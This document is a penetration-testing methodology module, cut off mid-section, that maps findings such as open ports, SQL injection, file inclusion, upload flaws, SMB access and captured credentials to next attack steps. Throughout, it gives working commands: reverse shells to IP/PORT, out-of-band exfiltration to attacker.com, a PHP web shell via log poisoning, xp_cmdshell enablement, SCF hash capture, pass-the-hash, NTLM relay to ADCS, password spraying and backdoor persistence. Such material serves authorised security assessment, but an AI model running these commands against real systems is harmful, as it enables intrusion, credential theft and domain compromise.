# Module 99: Attack Graph & Decision Engine

## How to Use This Module

This is the central navigation system for the entire methodology. When you find something during testing, look it up in the index below. Each entry answers:

- **What to do next** — Immediate step-by-step actions
- **What credentials can I obtain** — Explicit credential opportunities
- **What privilege escalation opportunities exist** — PrivEsc paths from this finding
- **What lateral movement opportunities exist** — Lateral paths from this finding
- **What domain escalation opportunities exist** — AD escalation paths
- **What if it fails** — Alternative paths when primary fails

---

## Finding Index

| Finding | Section | Priority |
|---------|---------|----------|
| Port 21 (FTP) open | [Service Ports](#port-21-ftp-open) | MEDIUM |
| Port 22 (SSH) open | [Service Ports](#port-22-ssh-open) | MEDIUM |
| Port 25 (SMTP) open | [Service Ports](#port-25-smtp-open) | LOW |
| Port 53 (DNS) open | [Service Ports](#port-53-dns-open) | MEDIUM |
| Port 80/443 (HTTP) open | [Web Findings](#web-server-found-port-804438088443) | HIGH |
| Port 88 (Kerberos) open | [Service Ports](#port-88-kerberos-open) | HIGH |
| Port 389/636 (LDAP) open | [Service Ports](#port-389636-ldap-open) | HIGH |
| Port 445 (SMB) open | [SMB Findings](#port-445-smb-open) | CRITICAL |
| Port 1433 (MSSQL) open | [Database Ports](#port-1433-mssql-open) | HIGH |
| Port 2049 (NFS) open | [Service Ports](#port-2049-nfs-open) | MEDIUM |
| Port 3306 (MySQL) open | [Database Ports](#port-3306-mysql-open) | HIGH |
| Port 3389 (RDP) open | [Service Ports](#port-3389-rdp-open) | MEDIUM |
| Port 5432 (PostgreSQL) open | [Database Ports](#port-5432-postgresql-open) | MEDIUM |
| Port 5985/5986 (WinRM) open | [Service Ports](#port-59855986-winrm-open) | HIGH |
| Port 6379 (Redis) open | [Service Ports](#port-6379-redis-open) | MEDIUM |
| SQL injection found | [Web Findings](#sql-injection-found) | CRITICAL |
| LFI/RFI found | [Web Findings](#lfirefi-found) | CRITICAL |
| File upload found | [Web Findings](#file-upload-found) | CRITICAL |
| Command injection found | [Web Findings](#command-injection-found) | CRITICAL |
| Valid credential obtained | [Credential Findings](#valid-credential-obtained) | CRITICAL |
| NT hash obtained | [Credential Findings](#nt-hash-obtained) | CRITICAL |
| Kerberos TGS ticket obtained | [Credential Findings](#kerberos-tgs-ticket-obtained) | HIGH |
| Responder captured hash | [Credential Findings](#responder-captured-nettlmmv2-hash) | CRITICAL |
| Shell on Linux host | [Access Findings](#shell-on-linux-host) | CRITICAL |
| Shell on Windows host | [Access Findings](#shell-on-windows-host) | CRITICAL |
| BloodHound DA path found | [AD Findings](#bloodhound-da-path-found) | CRITICAL |
| Domain-joined host found | [AD Findings](#domain-joined-host-compromised) | CRITICAL |
| Password spraying successful | [Credential Findings](#password-spraying-successful) | HIGH |
| Multi-homed host found | [Pivoting Findings](#multi-homed-host-discovered) | HIGH |
| SMB null session possible | [SMB Findings](#smb-null-session-anonymous-access) | CRITICAL |
| SMB signing disabled | [SMB Findings](#smb-signing-disabled) | CRITICAL |
| SMB writable share found | [SMB Findings](#smb-writable-share-found) | HIGH |
| LDAP anonymous bind possible | [Service Ports](#port-389636-ldap-open) | HIGH |
| No initial access | [Stuck Situations](#stuck-no-initial-access) | — |
| No privilege escalation | [Stuck Situations](#stuck-no-privilege-escalation) | — |
| No AD path | [Stuck Situations](#stuck-no-ad-attack-path) | — |

---

## Finding: Web Server Found (Port 80/443/8080/8443)

### What To Do Next

```
Web server found
│
├── STEP 1: Technology fingerprinting
│   ├── whatweb target → Tech stack, CMS, version
│   ├── curl -s -I target | grep Server → Server header
│   ├── curl -s -I target | grep X-Powered-By → Framework
│   └── View page source → Comments, hidden fields, JS files
│
├── STEP 2: CMS check → If CMS detected, switch to Module 08
│   ├── WordPress? → wpscan --url target --enumerate u,vp,vt
│   ├── Joomla? → joomscan -u target
│   ├── Drupal? → droopescan scan drupal -u target
│   └── Tomcat? → Check /manager/html, default creds, WAR upload
│
├── STEP 3: Content discovery
│   ├── ffuf directories (common.txt → directory-list-2.3-medium.txt)
│   ├── ffuf files (web-extensions.txt: .php, .asp, .txt, .bak, .old)
│   ├── ffuf vhosts (subdomains-top1million-5000.txt)
│   ├── Check robots.txt, sitemap.xml, crossdomain.xml
│   └── Check for backup files: .git, .svn, .DS_Store
│
├── STEP 4: Map application functionality
│   ├── Login page → Auth testing (default creds, brute force, registration)
│   ├── Search/news/id parameter → SQLi test
│   ├── File viewer/reader → LFI test
│   ├── File upload → Upload attack suite
│   ├── API endpoint → Parameter fuzzing, auth testing
│   ├── Contact/feedback form → XSS, command injection
│   └── Redirect parameter → SSRF, open redirect
│
└── STEP 5: Systematic injection testing
    ├── SQLi → ' " ) -- # /* */ ; (in all parameters)
    ├── XSS → <script> <img> <svg> (in all input fields)
    ├── LFI → ../../../etc/passwd (in file parameters)
    ├── CMDi → ; | && || (in all parameters)
    ├── SSRF → http://127.0.0.1 (in URL parameters)
    └── XXE → <!DOCTYPE (in XML input)
```

### Credentials Obtainable
- Database credentials from SQLi extraction
- Application credentials from config files via LFI
- Session cookies via XSS
- Hardcoded creds in JavaScript/page source

### Privilege Escalation Opportunities
- SQLi → xp_cmdshell (MSSQL) → SYSTEM shell
- LFI → Log poison → RCE → OS user
- File upload → Web shell → OS user → PrivEsc chain
- SQLi → LOAD_FILE/INTO OUTFILE → File read/write → RCE

### Lateral Movement Opportunities
- DB credentials → DB server direct access
- SSH keys found via LFI/file read
- Admin panel access → Further host access

### Domain Escalation Opportunities
- Domain credentials in web config files
- Web app uses domain auth → AD attack surface
- LFI reveals domain info → AD enumeration

### If This Fails
- Try larger content discovery wordlists
- Check non-standard ports for additional web servers
- Check for subdomains/vhosts you may have missed
- Switch to service port enumeration
- Try JavaScript analysis for hidden API endpoints

### Cross-References
- Web application testing (full) → [Module 04](04-web-application.md)
- CMS/application testing → [Module 08](08-common-apps.md)
- Shells and payloads → [Module 05](05-initial-access.md)
- Password attacks for web forms → [Module 06](06-password-attacks.md)

---

## Finding: SQL Injection Found

### What To Do Next

```
SQL injection confirmed in parameter
│
├── STEP 1: Determine DB type
│   ├── MySQL: version(), @@version
│   ├── MSSQL: @@version, db_name()
│   ├── PostgreSQL: version(), current_database()
│   └── Oracle: v$version, dual
│
├── STEP 2: Determine injection type
│   ├── Error-based → Extract via error messages
│   ├── UNION-based → Determine column count, find output cols
│   ├── Boolean-blind → Infer data via true/false responses
│   └── Time-blind → Infer data via sleep delay
│
├── STEP 3: Extract current user and privileges
│   ├── MySQL: current_user(), user(), is_super_priv
│   ├── MSSQL: SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')
│   └── PostgreSQL: current_user, current_setting('is_superuser')
│
├── STEP 4: MSSQL only → Enable xp_cmdshell
│   ├── EXEC sp_configure 'show advanced options', 1; reconfigure
│   ├── EXEC sp_configure 'xp_cmdshell', 1; reconfigure
│   └── EXEC xp_cmdshell 'whoami' → System command execution
│
├── STEP 5: Data extraction
│   ├── Dump all databases → Look for users, passwords
│   ├── Look for credential tables: users, admins, config
│   └── Extract SSH keys if MySQL LOAD_FILE available
│
└── STEP 6: Escalate to RCE
    ├── MSSQL xp_cmdshell → Reverse shell
    ├── MySQL SELECT INTO OUTFILE → Web shell
    ├── MySQL UDF → Custom function → OS commands
    └── PostgreSQL COPY FROM PROGRAM → OS commands
```

### Credentials Obtainable
- Database user credentials (from user tables)
- Application passwords (plaintext or hash)
- Service account credentials (from config tables)
- Domain credentials (from corporate DBs)

### Privilege Escalation Opportunities
- MSSQL xp_cmdshell → SYTEM if service account is SYSTEM
- MySQL root → OS user via INTO OUTFILE
- MySQL root → Full DB read/write via LOAD_FILE

### Lateral Movement Opportunities
- MSSQL linked servers → SQL queries on other DB servers
- Found passwords → Test against SSH/RDP/SMB/WinRM
- DB credentials → Direct database server access

### Domain Escalation Opportunities
- Domain user credentials found in DB → AD enumeration
- MSSQL service account → Kerberoast/AD attacks

### If This Fails
- Try sqlmap with --tamper for WAF bypass
- Try different injection points (headers, cookies, JSON)
- Check for blind injection (did you test time-based?)
- Try encoded payloads (URL, base64, hex)

### Cross-References
- SQLi technical techniques → [Module 04](04-web-application.md)
- Database service attacks → [Module 07](07-common-services.md)
- Post-exploitation credential use → [Module 13](13-post-exploitation.md)

---

## Finding: LFI/RFI Found

### What To Do Next

```
File inclusion / path traversal confirmed
│
├── STEP 1: Determine inclusion type
│   ├── LFI (local only) → File read on local system
│   └── RFI (remote) → Include remote URL → Code execution
│
├── STEP 2: LFI basic file read
│   ├── /etc/passwd → User enumeration
│   ├── /etc/hostname → System identification
│   ├── /proc/self/environ → Environment variables (may contain creds)
│   ├── /proc/self/cmdline → Command line of web server process
│   └── /proc/1/cmdline → Init process / Docker info
│
├── STEP 3: Application source disclosure
│   ├── php://filter/convert.base64-encode/resource=config.php
│   ├── php://filter/convert.base64-encode/resource=db.php
│   ├── php://filter/convert.base64-encode/resource=.env
│   └── index.php, admin.php, login.php → Creds in source
│
├── STEP 4: LFI to RCE via log poisoning
│   ├── Identify log path: /var/log/apache2/access.log
│   │                         /var/log/apache/access.log
│   │                         /var/log/nginx/access.log
│   │                         /var/log/httpd/access_log
│   ├── Inject PHP payload in User-Agent header
│   │   └── curl -A "<?php system($_GET['c']); ?>" target
│   ├── Include the log file: ?page=../../../var/log/apache2/access.log
│   └── Execute: ?page=../../../var/log/apache2/access.log&c=id
│
├── STEP 5: PHP wrapper RCE
│   ├── php://input → POST PHP code directly
│   ├── data://text/plain;base64,<base64_payload>
│   ├── expect://command (if expect module loaded)
│   └── phar:// → Deserialization (if phar file on system)
│
└── STEP 6: /proc/self/environ poisoning
    ├── Inject PHP in User-Agent
    └── Include /proc/self/environ → Code execution
```

### Credentials Obtainable
- Database credentials from config files (config.php, db.php, .env)
- SSH private keys (id_rsa, id_dsa)
- Application API keys from source code
- Environment variable tokens/keys

### Privilege Escalation Opportunities
- RCE via log poison/proc_environ → Interactive shell → PrivEsc
- Read /etc/shadow (if www-data can read it) → Hash cracking
- Read /root/.ssh/id_rsa (if readable) → SSH as root

### Lateral Movement Opportunities
- SSH keys found → SSH to other hosts
- Database credentials → DB server access
- Application admin credentials → Web admin dashboard

### Domain Escalation Opportunities
- Domain service account creds in config files
- LDAP config creds → AD access

### If This Fails
- Try encoded variants: ..%252f, ..%c0%af, /..%5c..
- Try different wrapper: php://filter vs php://input vs data://
- Try RFI with different protocols: ftp://, sftp://, dict://
- Try /proc/self/fd/XX with different file descriptors
- Check for Windows: ..\\, ..%5c

### Cross-References
- File inclusion techniques → [Module 04](04-web-application.md)
- Shells and payloads → [Module 05](05-initial-access.md)
- File transfer methods → [Module 05](05-initial-access.md)

---

## Finding: File Upload Found

### What To Do Next

```
File upload functionality found
│
├── STEP 1: Test restrictions
│   ├── Client-side only? → Disable JS or intercept with proxy
│   ├── Content-Type validation? → Change to image/jpeg
│   ├── Extension blacklist? → Alternate extensions (.php5, .phtml, .shtml)
│   ├── Extension whitelist? → Double extensions, null byte
│   ├── Content validation? → Magic bytes (GIF89a prefix)
│   └── Size limit? → Check if chunking bypass works
│
├── STEP 2: Bypass techniques
│   ├── Double extension: shell.php.jpg, file.php.txt
│   ├── Alternate extension: .php5, .pht, .phtml, .shtml, .php7
│   ├── Case variation: .PHP, .Php, .pHP
│   ├── Null byte: shell.php%00.jpg (PHP < 5.3)
│   ├── Magic bytes: GIF89a + PHP code
│   ├── Content-Type: image/jpeg, image/png, image/gif
│   ├── Character injection: shell.php .jpg, shell.php%0a.jpg
│   └── Race condition: upload shell.php and access before rename
│
├── STEP 3: RCE via uploaded file
│   ├── Upload PHP web shell → Command execution
│   ├── Upload .htaccess → Enable PHP in upload dir → All files as PHP
│   ├── Upload .user.ini → auto_prepend_file → Code before every request
│   └── Upload phar file → Deserialization via phar:// wrapper
│
├── STEP 4: Special cases
│   ├── SVG upload → XSS via SVG script tag
│   ├── PDF upload → XXE via PDF XML parsing
│   ├── DOCX/XLSX upload → Office XML attacks
│   └── ZIP upload → Zip slip / path traversal
│
└── STEP 5: Post-exploitation
    ├── Web shell → Reverse shell upgrade
    ├── Web shell → Database credentials → DB access
    └── Web shell → Internal network scanning
```

### Credentials Obtainable
- Config files read via web shell
- Database creds from web shell command execution

### Privilege Escalation Opportunities
- OS user shell → Linux/Windows priv escalation chain
- Web server user → Check sudo/suid/capabilities

### Lateral Movement Opportunities
- Internal network scanning from shell
- SSH keys via file system access

### Domain Escalation Opportunities
- Domain join check from shell
- Domain credentials on file system

### If This Fails
- Try more extension bypasses (all from SecLists/Web-Content)
- Check if upload dir is outside web root (need directory traversal)
- Try Phar deserialization instead of direct PHP execution
- Check for .htaccess write permission (override config)
- Try content-type-based bypass even if extension is blocked

### Cross-References
- File upload techniques → [Module 04](04-web-application.md)
- Shells and payloads → [Module 05](05-initial-access.md)

---

## Finding: Command Injection Found

### What To Do Next

```
Command injection confirmed
│
├── STEP 1: Determine injection type
│   ├── Visible (output returns) → Direct command execution
│   └── Blind (no output) → Time-based or OOB exfiltration
│
├── STEP 2: Test injection characters
│   ├── ; cmd → Semicolon injection
│   ├── | cmd → Pipe injection
│   ├── || cmd → OR injection
│   ├── & cmd → Background injection
│   ├── `cmd` → Backtick injection
│   ├── $(cmd) → Subshell injection
│   └── ; sleep 5 → Time-based test
│
├── STEP 3: Reverse shell
│   ├── bash -i >& /dev/tcp/IP/PORT 0>&1
│   ├── python3 -c 'import socket...'
│   ├── php -r '$sock=fsockopen...'
│   └── nc -e /bin/sh IP PORT
│
├── STEP 4: Blind injection techniques
│   ├── Time-based: ; sleep 10 → Confirm execution
│   ├── OOB DNS: ; nslookup attacker.com
│   ├── OOB HTTP: ; curl http://attacker/exfil
│   └── File write: ; echo "payload" > /tmp/shell.sh
│
└── STEP 5: Filter bypass
    ├── Space filter: ${IFS}, %20, <TAB>
    ├── Slash filter: $HOME, $PWD
    ├── Blacklist: e''cho, base64 encode
    └── Blind: Redirect output to accessible file
```

### Credentials Obtainable
- Environment variables (env) from command output
- Config files read via cat/find commands
- Database connection strings

### Privilege Escalation Opportunities
- OS user → Full Linux priv escalation chain
- Check sudo -l → Potential root escalation

### Lateral Movement Opportunities
- Internal network scanning from compromised host
- SSH key discovery → SSH to other hosts

### Domain Escalation Opportunities
- Check realm/hostname for domain join
- Domain credentials on compromised host

### If This Fails
- Try different injection syntax per OS (Linux vs Windows)
- Windows: use & (not ;) for PowerShell commands
- Try URL-encoded payloads
- Try POST body instead of GET parameter
- Check for WAF/input sanitization bypasses

### Cross-References
- Command injection techniques → [Module 04](04-web-application.md)
- Shells and payloads → [Module 05](05-initial-access.md)

---

## Finding: Port 445 (SMB) Open

### What To Do Next

```
SMB port 139/445 open
│
├── STEP 1: Null session/anonymous check (HIGH PRIORITY)
│   ├── smbclient -N -L //target → List shares
│   ├── rpcclient -U "" -N target → RPC commands
│   │   ├── enumdomusers → Domain users
│   │   ├── enumdomgroups → Domain groups
│   │   ├── enumalsgroups builtin → Local groups
│   │   ├── querydominfo → Domain info
│   │   └── srvinfo → Server info
│   └── enum4linux target → Automated dump
│       └── OUTPUT: Domain users, shares, OS info, policy
│
├── STEP 2: If null session works
│   ├── [CRED OPP] Read all shares → Find configs, passwords, SSH keys
│   ├── [CRED OPP] Domain user list → Password spray (Module 06)
│   ├── [AD OPP] Domain info → AD enumeration (Module 11)
│   └── [ACCESS OPP] Write share → Upload web shell if mapped to web
│
├── STEP 3: SMB signing check (HIGH PRIORITY)
│   ├── nmap --script smb2-security-mode -p 445 target
│   ├── If signing disabled:
│   │   ├── [CRITICAL] SMB relay possible
│   │   └── Test: ntlmrelayx.py -tf targets.txt -smb2support
│   │       └── Can relay to ADCS? → Certificate → DA
│   └── If signing required → Move on
│
├── STEP 4: Vulnerability check
│   ├── MS17-010 (EternalBlue): nmap --script smb-vuln-ms17-010
│   ├── smb-vuln-cve-2017-7494 (SambaCry)
│   └── searchsploit smb <version>
│
├── STEP 5: If credentials available
│   ├── netexec smb target -u user -p pass
│   │   ├── --shares → List accessible shares
│   │   ├── -x whoami → Remote command execution (if admin)
│   │   └── --sam → Dump SAM (if admin)
│   └── smbmap -H target -u user -p pass → Recursive file listing
│       └── Download sensitive files
│
└── STEP 6: Pass-the-Hash (if NT hash available)
    ├── psexec.py -hashes :hash domain/user@target
    ├── wmiexec.py -hashes :hash domain/user@target
    └── smbexec.py -hashes :hash domain/user@target
```

### Credentials Obtainable
- Domain usernames (from null session RPC)
- Config files with passwords (from readable shares)
- Unattend.xml cpassword (GPP password)
- Domain user hashes (if SMB relay capture works)
- SAM hashes (if admin access via SMB)

### Privilege Escalation Opportunities
- Admin share (C$, ADMIN$) access → Full file system control
- Write share → Web shell → OS user
- PSExec → SYSTEM level shell (if admin)

### Lateral Movement Opportunities
- Pass-the-Hash → Every host with same local admin
- Domain user creds → RDP/WinRM/SSH to domain hosts
- SMB relay → Code exec on relay target

### Domain Escalation Opportunities
- Domain user list → Password spray → AD access
- Domain info → AD module enumeration
- SMB relay to DC → Domain compromise

### If This Fails
- SMBv1 disabled? Check with --script smb-protocols
- Null session disabled? Try with guest account
- Shares empty? Check hidden shares (C$, ADMIN$, IPC$)
- No creds? Move to LDAP anonymous, Responder, or Kerberos attacks
- Consider SMB relay even if you can't auth directly

### Cross-References
- Full SMB attack methodology → [Module 07](07-common-services.md)
- User/spray from SMB users → [Module 06](06-password-attacks.md)
- Domain attacks from SMB info → [Module 11](11-active-directory.md)
- Pass-the-Hash lateral movement → [Module 12](12-lateral-pivot.md)

---

## Finding: SMB Null Session / Anonymous Access

### What To Do Next

```
SMB null session possible
│
├── STEP 1: Enumerate everything
│   ├── enum4linux -a target → Users, groups, shares, OS, policy
│   ├── rpcclient -U "" -N target → Manual RPC enumeration
│   │   ├── enumdomusers → ALL domain users
│   │   ├── queryuser <rid> → User details (lastlogon, groups)
│   │   ├── enumdomgroups → Domain groups with RIDs
│   │   └── getdompwinfo → Password policy
│   └── smbclient -N -L //target → ALL shares
│
├── STEP 2: Check each share
│   ├── smbclient //target/ShareName -N
│   ├── RECURSIVE download: smb: \> recurse; prompt; mget *
│   └── Look for: .config, .sql, .env, .xml, passwords.*, creds.*
│       ├── Found web.config? → DB creds, API keys
│       ├── Found groups.xml? → GPP cpassword → gpp-decrypt
│       ├── Found .ssh? → SSH keys → SSH access
│       └── Found database backup? → DB creds
│
├── STEP 3: User list → Password spray
│   ├── Save ALL usernames to file
│   ├── netexec smb target -u users.txt -p 'CompanyName1!'
│   ├── netexec smb target -u users.txt -p 'Spring2024!'
│   ├── netexec smb target -u users.txt -p 'Welcome1'
│   └── Monitor for lockouts! Start slow
│
└── STEP 4: OS info from null session
    ├── Check for Windows version → Kernel exploits?
    ├── Check domain name → AD module prep
    └── Check password policy → Spray strategy
```

### Credentials Obtainable
- Domain usernames (required for spray/AS-REP/Kerbrute)
- GPP cpassword (decryptable domain credential)
- Config file passwords from share files
- Domain password policy (for spray strategy)

### Privilege Escalation Opportunities
- Domain user cred (from spray) → potential local admin on some hosts
- Service account creds from configs → service exploitation

### Lateral Movement Opportunities
- Every cracked credential → test across all hosts
- SSH keys from shares → SSH to Linux hosts

### Domain Escalation Opportunities
- Any domain user → Begin BloodHound/AD enumeration
- Domain admin creds in SYSVOL (rare but exists)

### If This Fails
- SYSVOL not readable due to permissions
- Users enumerated but no password spray success
- Try larger spray list (Seasons, Company variants)
- Move to AS-REP roasting (no creds needed)

### Cross-References
- Password spray techniques → [Module 06](06-password-attacks.md)
- AD enumeration → [Module 11](11-active-directory.md)

---

## Finding: SMB Signing Disabled

### What To Do Next

```
SMB signing disabled on target
│
├── THIS IS CRITICAL — NTLM relay opportunity
│
├── STEP 1: Confirm signing disabled
│   ├── nmap --script smb2-security-mode -p 445 target
│   │   └── Look for: "Message signing enabled but not required"
│
├── STEP 2: Identify relay targets
│   ├── Scan for other hosts with SMB open
│   ├── PRIMARY TARGET: Domain Controllers (ADCS relay)
│   ├── SECONDARY: Any host where you want code execution
│   └── Check if ADCS is present: http://dc/certsrv
│
├── STEP 3: Relay without coercion
│   │   Wait for existing SMB traffic to capture
│   ├── ntlmrelayx.py -tf targets.txt -smb2support
│   │   └── When a user connects, their hash is relayed
│
├── STEP 4: Relay with coercion (Responder)
│   ├── Edit Responder.conf: SMB=Off, HTTP=Off (let relay handle)
│   ├── sudo python3 Responder.py -I eth0
│   ├── ntlmrelayx.py -tf targets.txt -smb2support
│   └── When LLMNR/NBT-NS poison triggered → hash relayed
│
├── STEP 5: Relay to ADCS (domain dominance)
│   ├── Target: http://dc-ip/certsrv
│   ├── ntlmrelayx.py -t http://dc/certsrv -smb2support -adcs
│   └── SUCCESS → Certificate obtained → Domain auth → DA
│
└── STEP 6: Post-relay
    ├── [ACCESS] Shell on relay target (if SMB relay)
    ├── [DOMAIN] Certificate → Rubeus asktgt → DA (if ADCS)
    └── [CRED] Captured hashes → Crack offline → Spray
```

### Credentials Obtainable
- NetNTLMv2 hashes via SMB capture
- Domain credentials via Active Directory Certificate Services
- Shell on relay target → Full credential harvesting

### Privilege Escalation Opportunities
- Shell on relay target → Full privesc chain

### Lateral Movement Opportunities
- Shell on new host → Lateral from there
- Domain credentials → Further lateral movement

### Domain Escalation Opportunities
- ADCS relay → Certificate → Domain controller auth → DA
- Domain user credentials → BloodHound/AD attack chain

### If This Fails
- No other hosts accessible for relay → Use Responder alone
- No ADCS → Relay to SMB only
- All targets require signing → Use opportunistic capture
- Consider DNS spoofing or WPAD poisoning for coercion

### Cross-References
- NTLM relay technical setup → [Module 12](12-lateral-pivot.md)
- ADCS exploitation → [Module 11](11-active-directory.md)
- Responder usage → [Module 11](11-active-directory.md)

---

## Finding: SMB Writable Share Found

### What To Do Next

```
SMB writable share discovered
│
├── STEP 1: Determine share path
│   ├── Is the share accessible via web?
│   │   ├── Upload PHP web shell → Direct RCE via browser
│   │   └── Or map to web directory? (inetpub, /var/www)
│   └── Check if overwriting existing files possible
│
├── STEP 2: Web-accessible share → Web shell
│   ├── Upload cmd.php: <?php system($_GET['c']); ?>
│   ├── Execute: http://target/share/cmd.php?c=whoami
│   └── Upgrade to reverse shell
│
├── STEP 3: Non-web share → File-based attacks
│   ├── Upload malicious .lnk file → SMB hash capture on click
│   ├── Upload shortcut/script in startup folder
│   ├── Upload malicious DLL for hijacking
│   ├── Upload phishing document (.doc, .xls with macro)
│   ├── Upload SSH authorized_keys (if ~/.ssh accessible)
│   └── Overwrite cron scripts (Linux)
│
├── STEP 4: SCF file attack (if users browse the share)
│   ├── Create shell.scf on writable share
│   │   └── [ShellClassInfo]\nIconFile=\\\\attacker\\share\\test
│   ├── When user browses folder → SMB auth attempt
│   └── Captured hash → Crack or relay
│
└── STEP 5: Persistence
    ├── Add your SSH key to authorized_keys
    └── Create backdoor user via script execution
```

### Credentials Obtainable
- NetNTLMv2 hashes via SCF/LNK file attacks
- Administrator passwords via startup script injections

### Privilege Escalation Opportunities
- RCE via web shell → OS user → PrivEsc chain
- Startup script → SYSTEM execution on admin login
- Cron overwrite → Root execution

### Lateral Movement Opportunities
- Shell from share-based RCE → Lateral from new host
- Captured hashes → Password attack

### Domain Escalation Opportunities
- Domain user sessions → Hash capture via SCF
- Host is domain joined → AD attack chain

### If This Fails
- No web mapping → Try all other file-based attacks
- Can't write files → Check if you can delete (replace existing)
- Can't execute → Move to credential harvesting from readable shares

### Cross-References
- File upload/web shell → [Module 05](05-initial-access.md)
- Hash capture techniques → [Module 11](11-active-directory.md)

---

## Finding: Valid Credential Obtained

### What To Do Next

```
Credential obtained (username + password or hash)
│
├── STEP 1: Classify the credential
│   ├── Source: (SMB share, SQLi, LSASS dump, config file, etc.)
│   ├── Type: [Cleartext password] [NT hash] [Kerberos ticket] [SSH key]
│   └── Domain: [local] [domain] [service account] [unknown]
│
├── STEP 2: Test against SOURCE host (other services)
│   ├── SMB → netexec smb source -u user -p pass
│   ├── WinRM → evil-winrm -i source -u user -p pass
│   ├── RDP → xfreerdp /v:source /u:user /p:pass
│   ├── SSH → ssh user@source
│   └── MSSQL → mssqlclient.py user:pass@source
│
├── STEP 3: Test against ALL hosts in subnet
│   ├── netexec smb subnet -u user -p pass
│   ├── netexec winrm subnet -u user -p pass
│   └── hydra -l user -p pass ssh://target -t 1
│
├── STEP 4: If domain credential → AD enumeration
│   ├── BloodHound: bloodhound-python -u user -p pass -d domain -ns dc
│   ├── Kerberoasting: GetUserSPNs -request
│   ├── Password spray: Same password, DIFFERENT users
│   └── LDAP enumeration: full domain dump
│
├── STEP 5: If NTLM hash → Pass-the-Hash
│   ├── psexec.py -hashes :hash domain/user@target
│   ├── wmiexec.py -hashes :hash domain/user@target
│   ├── evil-winrm -i target -u user -H hash
│   └── xfreerdp /v:target /u:user /pth:hash
│
└── STEP 6: Document and tag
    ├── Save to credential store (where found, what it accesses)
    ├── Tag: [local admin] [domain user] [service account] [domain admin]
    └── Note password patterns for guessing other passwords
```

### Credentials Obtainable
- From root: All hashes, SSH keys, config creds
- From service account: Kerberos tickets, linked service access
- From domain user: AD-wide access potential

### Privilege Escalation Opportunities
- Admin credentials → Full host control
- Service account → Potential local admin on service hosts
- Domain user → BloodHound path to DA

### Lateral Movement Opportunities
- Credential testing across all hosts (primary use)
- Pass-the-Hash to any host with same local admin
- Domain credential → WinRM/SMB/RDP to domain hosts

### Domain Escalation Opportunities
- Domain user → BloodHound → DA path
- Service account → Kerberoast → Lateral escalation
- Domain admin credential → DCSync → Full domain

### If This Fails
- Credential doesn't work anywhere → Try username variations
- Password fails → Try with hash instead (if NTLM available)
- Account locked out → Wait, try different user
- No services accessible → Check firewall/pivoting

### Cross-References
- Credential harvesting techniques → [Module 13](13-post-exploitation.md)
- Lateral movement methods → [Module 12](12-lateral-pivot.md)
- Password cracking → [Module 06](06-password-attacks.md)

---

## Finding: NT Hash Obtained

### What To Do Next

```
NT hash acquired (from SAM, LSASS, or other dumping)
│
├── STEP 1: Parallel operations
│   ├── [FOREGROUND] Immediately try Pass-the-Hash
│   └── [BACKGROUND] Start hashcat to crack
│
├── STEP 2: Pass-the-Hash (TRY IMMEDIATELY)
│   ├── SMB: psexec.py -hashes :hash domain/user@target
│   ├── SMB: wmiexec.py -hashes :hash domain/user@target
│   ├── WinRM: evil-winrm -i target -u user -H hash
│   ├── RDP: xfreerdp /v:target /u:user /pth:hash
│   └── Impacket: atexec.py, dcomexec.py, smbexec.py -hashes
│
├── STEP 3: Crack with hashcat (background)
│   ├── Mode: -m 1000 (NTLM)
│   ├── Priority order:
│   │   1. rockyou.txt (dictionary, fast)
│   │   2. rockyou.txt + best64.rule (mutations, medium)
│   │   3. rockyou.txt + d3ad0ne.rule (comprehensive, slow)
│   └── Show results: hashcat -m 1000 hash.txt --show
│
├── STEP 4: Cracking success → cleartext password
│   ├── Test password for user on other services
│   ├── Spray pattern (same password, different users)
│   └── Add to credential tracking DB
│
└── STEP 5: Identify source context
    ├── Is it a local account? → Test local admin on other hosts
    ├── Is it a domain account? → Full AD module
    └── Is it a service account? → Check SPN, service config
```

### Credentials Obtainable
- Cleartext password (if cracked)
- Local admin on other hosts (password reuse)
- Domain account access (if domain account)

### Privilege Escalation Opportunities
- If an admin hash → Admin on the host → Full control
- Service account hash → Potential service exploitation

### Lateral Movement Opportunities
- PTH to SMB/WinRM/RDP to target host
- Same local admin hash → Admin on multiple hosts
- Cracking reveals password pattern for guessing

### Domain Escalation Opportunities
- Domain account hash → AD enumeration
- Domain admin hash → DCSync → Full domain
- Cached domain creds → Kerberos attacks

### If This Fails
- PTH rejected → Check if target accepts NTLM auth
- Hash doesn't crack → Try longer wordlists, rules, masks
- Hash cracked but doesn't work → Wrong service/user mapping
- Try overpass-the-hash (convert NTLM to Kerberos TGT)

### Cross-References
- Pass-the-Hash technical methods → [Module 12](12-lateral-pivot.md)
- Hashcat cracking modes → [Module 06](06-password-attacks.md)

---

## Finding: Kerberos TGS Ticket Obtained

### What To Do Next

```
Kerberos TGS ticket obtained (Kerberoasting)
│
├── STEP 1: Crack the TGS ticket
│   ├── Mode: hashcat -m 13100
│   ├── Dictionary first: hashcat -m 13100 ticket.txt rockyou.txt
│   ├── Rules: hashcat -m 13100 ticket.txt rockyou.txt -r best64.rule
│   └── Note: TGS cracking is slower than NTLM
│
├── STEP 2: If cracked → Service account password
│   ├── Determine which service the SPN runs
│   │   ├── MSSQL? → Full SQL server access
│   │   ├── IIS? → Web server management access
│   │   └── Generic service? → Test on target host
│   └── Test credential: SMB, WinRM, RDP on service host
│
├── STEP 3: Silver Ticket (if know target service hash)
│   ├── Forge TGS: impacket-ticketer -nthash hash -spn service/target
│   └── Access service without further authentication
│
├── STEP 4: Service account lateral movement
│   ├── Service account may be local admin on service host
│   ├── Check if service account can access other resources
│   └── Enumerate SPN hosts for further attack
│
└── STEP 5: If NOT cracked
    ├── Note the account name for later attempts
    ├── Service account may be usable in delegation attacks
    └── Check if same service account has other SPNs
```

### Credentials Obtainable
- Service account cleartext password (if cracked)
- Service account access to service host

### Privilege Escalation Opportunities
- Service account may be local admin on multiple hosts
- Some service accounts are Domain Admins (misconfiguration)

### Lateral Movement Opportunities
- Service account creds → SSH/RDP/SMB to service host
- Silver Ticket → Persistent service access
- Service account Kerberos TGT → AD enumeration

### Domain Escalation Opportunities
- Service account → BloodHound → DA path (if domain account)
- Service account delegation → Impersonate other users
- Service account with DCSync rights (rare but exists)

### If This Fails
- TGS doesn't crack → Try AS-REP roasting instead (different user)
- Service account not privileged → Note for later use (delegation)
- No SPNs found → Check for other Kerberos attack paths
- Try with john instead of hashcat (some formats crack better)

### Cross-References
- Kerberoasting technical setup → [Module 11](11-active-directory.md)
- Cracking methodology → [Module 06](06-password-attacks.md)
- Silver Ticket → [Module 11](11-active-directory.md)

---

## Finding: Responder Captured NetNTLMv2 Hash

### What To Do Next

```
